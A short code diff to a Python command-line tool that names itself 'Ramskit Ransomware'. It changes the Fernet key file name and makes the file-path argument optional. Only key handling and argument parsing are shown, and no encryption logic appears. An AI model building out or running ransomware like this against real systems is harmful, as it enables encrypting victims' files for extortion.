@@ -63,13 +63,13 @@ class Ramskit:
     @staticmethod
     def generate_key():
         key = Fernet.generate_key()
-        with open('key.txt', 'wb') as file:
+        with open('key.key', 'wb') as file:
             file.write(key)
         return key
 
     @staticmethod
     def load_key():
-        with open('key.txt', 'rb') as file:
+        with open('key.key', 'rb') as file:
             return file.read()
         return None
 
@@ -93,7 +93,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
     parser.add_argument('-a', '--action', dest="action", required=True,
                         help='Action to perform [encrypt/decrypt/generate_key]')
-    parser.add_argument('-p', '--path', dest="path", required=True, help='Path to file(s) to encrypt/decrypt')
+    parser.add_argument('-p', '--path', dest="path", help='Path to file(s) to encrypt/decrypt')
     args = parser.parse_args()
 
     action = args.action.lower()
